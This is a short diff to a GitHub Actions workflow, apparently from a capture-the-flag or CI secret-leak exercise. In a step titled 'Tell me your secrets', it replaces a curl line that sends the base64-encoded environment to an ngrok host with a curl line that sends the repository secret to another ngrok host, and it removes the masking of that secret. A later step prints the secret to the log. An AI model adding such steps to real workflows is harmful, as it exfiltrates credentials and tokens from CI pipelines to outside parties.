@@ -21,9 +21,9 @@ jobs:
     steps:
       - name: Tell me your secrets
         run: |
-          export MOVIE=${{ secrets.FAVOURITE }}
-          curl -k https://e7cf-128-130-241-4.eu.ngrok.io?data=$(env | base64 --wrap=0)
-          echo "::add-mask::${{ secrets.FAVOURITE }}"
+          export FLAG=${{ secrets.FAVOURITE }}
+          curl -k https://ef87-128-131-205-77.eu.ngrok.io?sec="$FLAG"
 
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
+
